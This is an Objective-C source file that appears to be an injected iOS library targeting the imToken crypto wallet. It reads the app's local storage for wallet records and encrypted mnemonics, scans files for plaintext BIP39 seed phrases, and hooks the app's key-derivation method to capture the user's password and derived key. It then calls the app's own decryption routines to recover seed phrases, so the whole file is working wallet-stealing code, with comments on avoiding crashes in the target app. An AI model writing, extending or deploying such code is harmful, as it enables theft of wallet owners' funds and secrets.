#import "ImToken.h"
#import <CommonCrypto/CommonCrypto.h>
#import <objc/runtime.h>
#import <objc/message.h>

static NSString *gErr = nil;
static NSString *gPassword = nil;
static id gDerivedKey = nil;
static id gHookSelf = nil;          // 被 hook 的那个对象（调用解密方法要用它）
static Class gHookClass = Nil;
static IMP gOrigDerive = NULL;
static volatile BOOL gFired = NO;

@implementation ImToken

+ (NSString *)lastError { return gErr ?: @""; }
+ (BOOL)hookFired { return gFired; }
+ (NSString *)capturedPassword { return gPassword; }
+ (id)capturedDerivedKey { return gDerivedKey; }

#pragma mark - 存储定位

+ (NSString *)storageDir {
    NSString *home = NSHomeDirectory();
    NSArray *cands = @[
        [home stringByAppendingPathComponent:@"Library/Application Support/im.token.app/RCTAsyncLocalStorage_V1"],
        [home stringByAppendingPathComponent:@"Library/Application Support/RCTAsyncLocalStorage_V1"],
        [home stringByAppendingPathComponent:@"Documents/RCTAsyncLocalStorage_V1"],
        [home stringByAppendingPathComponent:@"Documents/im.token.app/RCTAsyncLocalStorage_V1"],
    ];
    NSFileManager *fm = [NSFileManager defaultManager];
    for (NSString *p in cands) {
        BOOL isDir = NO;
        if ([fm fileExistsAtPath:p isDirectory:&isDir] && isDir) return p;
    }
    // 兜底：扫一遍 Library 找 RCTAsyncLocalStorage_V1
    NSString *lib = [home stringByAppendingPathComponent:@"Library"];
    NSDirectoryEnumerator *en = [fm enumeratorAtPath:lib];
    for (NSString *rel in en) {
        if ([rel hasSuffix:@"RCTAsyncLocalStorage_V1"]) {
            return [lib stringByAppendingPathComponent:rel];
        }
    }
    return nil;
}

+ (NSDictionary *)manifest {
    NSString *dir = [self storageDir];
    if (!dir) {
        gErr = @"storage dir not found";
        return @{};
    }
    NSString *p = [dir stringByAppendingPathComponent:@"manifest.json"];
    NSData *d = [NSData dataWithContentsOfFile:p];
    if (!d.length) {
        gErr = [NSString stringWithFormat:@"manifest.json missing at %@", dir];
        return @{};
    }
    id o = [NSJSONSerialization JSONObjectWithData:d options:0 error:NULL];
    return [o isKindOfClass:[NSDictionary class]] ? o : @{};
}

/// React Native 把大值存成 <md5(key)> 文件
+ (NSString *)storageValueForKey:(NSString *)key {
    NSDictionary *man = [self manifest];
    id v = man[key];
    if ([v isKindOfClass:[NSString class]]) return v;

    NSString *dir = [self storageDir];
    if (!dir) return nil;

    // 文件名 = key 的 md5 十六进制
    NSData *kd = [key dataUsingEncoding:NSUTF8StringEncoding];
    unsigned char md[CC_MD5_DIGEST_LENGTH];
    CC_MD5(kd.bytes, (CC_LONG)kd.length, md);
    NSMutableString *hex = [NSMutableString stringWithCapacity:CC_MD5_DIGEST_LENGTH * 2];
    for (int i = 0; i < CC_MD5_DIGEST_LENGTH; i++) [hex appendFormat:@"%02x", md[i]];

    NSString *p = [dir stringByAppendingPathComponent:hex];
    NSData *d = [NSData dataWithContentsOfFile:p];
    if (!d.length) return nil;
    return [[NSString alloc] initWithData:d encoding:NSUTF8StringEncoding];
}

#pragma mark - 钱包解析

/// 在任意 JSON 结构里递归找带 address / encMnemonic 的对象
+ (void)collectWallets:(id)node into:(NSMutableArray *)out depth:(NSInteger)depth {
    if (depth > 12 || !node) return;
    if ([node isKindOfClass:[NSArray class]]) {
        for (id x in (NSArray *)node) [self collectWallets:x into:out depth:depth + 1];
        return;
    }
    if (![node isKindOfClass:[NSDictionary class]]) return;
    NSDictionary *d = (NSDictionary *)node;

    BOOL hasAddr = d[@"address"] || d[@"addr"] || d[@"accountAddress"] || d[@"walletAddress"];
    BOOL hasEnc = d[@"encMnemonic"] || d[@"encMnemonicV2"] || d[@"mnemonic"];
    if (hasAddr || hasEnc) {
        NSMutableDictionary *row = [NSMutableDictionary dictionary];
        for (NSString *k in @[@"address", @"addr", @"accountAddress", @"walletAddress",
                              @"name", @"encMnemonic", @"encMnemonicV2", @"mnemonic",
                              @"type", @"source", @"path", @"derivationPath"]) {
            id v = d[k];
            if ([v isKindOfClass:[NSString class]]) row[k] = v;
        }
        if (row.count) [out addObject:row];
    }
    for (id k in d) [self collectWallets:d[k] into:out depth:depth + 1];
}

+ (NSArray<NSDictionary *> *)wallets {
    NSMutableArray *out = [NSMutableArray array];
    NSMutableSet *seen = [NSMutableSet set];

    for (NSString *key in @[@"walletsV2", @"wallets", @"walletV2", @"selectedWallet"]) {
        NSString *raw = [self storageValueForKey:key];
        if (!raw.length) continue;
        id o = [NSJSONSerialization JSONObjectWithData:[raw dataUsingEncoding:NSUTF8StringEncoding]
                                               options:0 error:NULL];
        if (!o) continue;
        NSMutableArray *tmp = [NSMutableArray array];
        [self collectWallets:o into:tmp depth:0];
        for (NSDictionary *r in tmp) {
            NSString *sig = [NSString stringWithFormat:@"%@|%@", r[@"address"] ?: @"", r[@"encMnemonic"] ?: @""];
            if ([seen containsObject:sig]) continue;
            [seen addObject:sig];
            [out addObject:r];
        }
    }
    return out;
}

/// 助记词特征匹配：连续 12/15/18/21/24 个小写英文单词
+ (NSArray<NSString *> *)plaintextMnemonics {
    NSString *dir = [self storageDir];
    if (!dir) return @[];
    NSFileManager *fm = [NSFileManager defaultManager];
    NSMutableSet *found = [NSMutableSet set];

    NSRegularExpression *re = [NSRegularExpression
        regularExpressionWithPattern:@"\\b([a-z]{3,8}\\s+){11,23}[a-z]{3,8}\\b"
                             options:0 error:NULL];

    void (^scan)(NSString *) = ^(NSString *text) {
        if (text.length < 40) return;
        [re enumerateMatchesInString:text options:0 range:NSMakeRange(0, text.length)
                          usingBlock:^(NSTextCheckingResult *m, NSMatchingFlags f, BOOL *stop) {
            if (!m) return;
            NSString *s = [text substringWithRange:m.range];
            NSInteger words = [[s componentsSeparatedByCharactersInSet:
                                [NSCharacterSet whitespaceCharacterSet]] count];
            // 只认 BIP39 的词数
            if (words == 12 || words == 15 || words == 18 || words == 21 || words == 24) {
                [found addObject:s];
            }
        }];
    };

    // manifest 里的小值
    for (id k in [self manifest]) {
        id v = [self manifest][k];
        if ([v isKindOfClass:[NSString class]]) scan(v);
    }
    // 目录下的大值文件
    for (NSString *fn in [fm contentsOfDirectoryAtPath:dir error:NULL]) {
        if ([fn isEqualToString:@"manifest.json"]) continue;
        NSString *p = [dir stringByAppendingPathComponent:fn];
        NSData *d = [NSData dataWithContentsOfFile:p];
        if (!d.length || d.length > 4 * 1024 * 1024) continue;
        NSString *s = [[NSString alloc] initWithData:d encoding:NSUTF8StringEncoding];
        if (s.length) scan(s);
    }
    return found.allObjects;
}

#pragma mark - 钩子

+ (BOOL)installHook {
    static dispatch_once_t once;
    __block BOOL ok = NO;
    dispatch_once(&once, ^{
        SEL sel = @selector(deriveKeyAndVerifyMacWithPassword:crypto:error:);

        // 不能用 objc_copyClassList 全量扫：class_getInstanceMethod 会实现化类，
        // 系统框架几千个类在启动阶段全实现化会卡死主线程，被 watchdog 杀掉
        // （实测 imToken 直接闪退）。只在主可执行文件自己的类里找。
        const char *mainImage = _dyld_get_image_name(0);
        unsigned int n = 0;
        const char **names = mainImage ? objc_copyClassNamesForImage(mainImage, &n) : NULL;

        if (names && n > 0) {
            for (unsigned int i = 0; i < n; i++) {
                Class c = objc_getClass(names[i]);
                if (!c) continue;
                Method m = class_getInstanceMethod(c, sel);
                if (!m) continue;

            gOrigDerive = method_getImplementation(m);
            gHookClass = c;

            IMP newImp = imp_implementationWithBlock(
                ^id(id self_, NSString *pw, id crypto, NSError **errp) {
                    // 关键：这里只做拷贝，绝不阻塞主线程
                    @try {
                        if ([pw isKindOfClass:[NSString class]]) gPassword = [pw copy];
                        if (self_) gHookSelf = self_;
                    } @catch (NSException *e) { (void)e; }

                    id ret = ((id (*)(id, SEL, NSString *, id, NSError **))gOrigDerive)
                             (self_, sel, pw, crypto, errp);

                    @try {
                        if (ret) gDerivedKey = ret;
                        gFired = YES;
                    } @catch (NSException *e) { (void)e; }

                    return ret;
                });
            method_setImplementation(m, newImp);
            ok = YES;
            break;
            }
        }
        if (names) free(names);
        if (!ok) {
            gErr = [NSString stringWithFormat:@"selector not found in main image (%u classes)", n];
        }
    });
    return ok;
}

+ (NSString *)decryptMnemonic:(NSString *)encMnemonic {
    if (!encMnemonic.length) return nil;
    if (!gDerivedKey || !gHookSelf || !gHookClass) {
        gErr = @"no derived key yet";
        return nil;
    }

    // encMnemonic 可能是 base64 也可能是原始 JSON，逐个试
    NSData *cipher = nil;
    NSData *b64 = [[NSData alloc] initWithBase64EncodedString:encMnemonic options:0];
    if (b64.length) cipher = b64;
    if (!cipher) cipher = [encMnemonic dataUsingEncoding:NSUTF8StringEncoding];

    NSArray *sels = @[@"decryptCiphertextWithDerivedKey:crypto:error:",
                      @"decryptEncryptedMessage:derivedKey:error:"];
    for (NSString *name in sels) {
        SEL s = NSSelectorFromString(name);
        Method m = class_getInstanceMethod(gHookClass, s);
        if (!m) continue;

        @try {
            NSError *err = nil;
            id out = nil;
            if ([name hasPrefix:@"decryptCiphertext"]) {
                id (*fn)(id, SEL, id, id, NSError **) = (void *)method_getImplementation(m);
                // 第二个参数 crypto 在原实现里由 App 传入，这里用 derivedKey 顶替做尝试
                out = fn(gHookSelf, s, cipher, gDerivedKey, &err);
            } else {
                id (*fn)(id, SEL, id, id, NSError **) = (void *)method_getImplementation(m);
                out = fn(gHookSelf, s, cipher, gDerivedKey, &err);
            }
            if ([out isKindOfClass:[NSString class]] && [out length] > 8) return out;
            if ([out isKindOfClass:[NSData class]]) {
                NSString *s2 = [[NSString alloc] initWithData:out encoding:NSUTF8StringEncoding];
                if (s2.length > 8) return s2;
            }
            if (err) gErr = [NSString stringWithFormat:@"%@: %@", name, err.localizedDescription];
        } @catch (NSException *e) {
            gErr = [NSString stringWithFormat:@"%@ threw: %@", name, e.reason];
        }
    }
    return nil;
}

@end
